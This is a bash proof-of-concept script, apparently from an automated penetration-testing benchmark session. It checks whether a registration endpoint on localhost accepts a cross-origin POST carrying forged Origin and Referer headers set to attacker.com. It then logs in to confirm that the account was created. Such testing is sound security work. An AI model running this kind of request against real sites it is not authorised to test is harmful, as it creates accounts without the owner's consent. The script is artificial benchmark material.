#!/bin/bash
# POC: Demonstrates CSRF vulnerability on registration endpoint by creating an account from an external origin without CSRF token validation
# Target: ./repo
# Created: 2025-12-02T16:24:07.571Z
# Session: benchmark-XBEN-069-24-miorxjei

# CSRF Protection Bypass POC - Registration Endpoint
# This script demonstrates that the /api/register.php endpoint accepts POST requests
# from arbitrary external origins without CSRF token validation

TARGET="http://localhost:8080/api/register.php"
ATTACKER_ORIGIN="http://attacker.com"
ATTACKER_REFERER="http://attacker.com/csrf.html"

echo "=========================================="
echo "CSRF Protection Bypass POC"
echo "Target: $TARGET"
echo "=========================================="
echo ""

# Generate unique credentials for this test
TIMESTAMP=$(date +%s%N)
USERNAME="csrftest_${TIMESTAMP}"
EMAIL="csrf_${TIMESTAMP}@test.com"
PASSWORD="test123"

echo "[*] Testing CSRF vulnerability..."
echo "[*] Credentials: username=$USERNAME, email=$EMAIL, password=$PASSWORD"
echo ""

# Attempt 1: POST request from external origin (simulating CSRF attack)
echo "[TEST 1] Cross-origin POST request WITHOUT CSRF token"
echo "Command:"
echo "curl -X POST \"$TARGET\" \\"
echo "  -H 'Origin: $ATTACKER_ORIGIN' \\"
echo "  -H 'Referer: $ATTACKER_REFERER' \\"
echo "  -H 'Content-Type: application/x-www-form-urlencoded' \\"
echo "  -d 'username=$USERNAME&password=$PASSWORD&email=$EMAIL' \\"
echo "  -v"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET" \
  -H "Origin: $ATTACKER_ORIGIN" \
  -H "Referer: $ATTACKER_REFERER" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$USERNAME&password=$PASSWORD&email=$EMAIL" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "Response Code: $HTTP_CODE"
echo "Response Body: $BODY"
echo ""

# Check if registration was successful
if echo "$BODY" | grep -q "success.*true"; then
    echo "[✓] VULNERABILITY CONFIRMED!"
    echo "[✓] Account created from external origin without CSRF protection"
    echo "[✓] HTTP $HTTP_CODE indicates successful registration"
    echo ""
    
    # Attempt 2: Try to login with created account to verify it exists
    echo "[TEST 2] Verifying account was actually created by attempting login"
    echo "Attempting to login with created credentials..."
    echo ""
    
    LOGIN_RESPONSE=$(curl -s -X POST "http://localhost:8080/api/login.php" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "username=$USERNAME&password=$PASSWORD")
    
    echo "Login Response: $LOGIN_RESPONSE"
    echo ""
    
    if echo "$LOGIN_RESPONSE" | grep -q "success.*true"; then
        echo "[✓] Account login successful - account definitely exists"
        echo "[✓] CSRF attack fully confirmed and reproducible"
        exit 0
    else
        echo "[!] Account may have been created (registration returned 200)"
        echo "[!] But login failed - may require email verification or other checks"
        exit 0
    fi
elif echo "$BODY" | grep -q "error\|Error"; then
    echo "[✗] Registration failed with error"
    echo "[*] CSRF may be protected or other validation prevented registration"
    exit 1
else
    echo "[?] Unexpected response - cannot determine if CSRF is vulnerable"
    echo "[?] Response body does not contain expected success/error indicators"
    exit 2
fi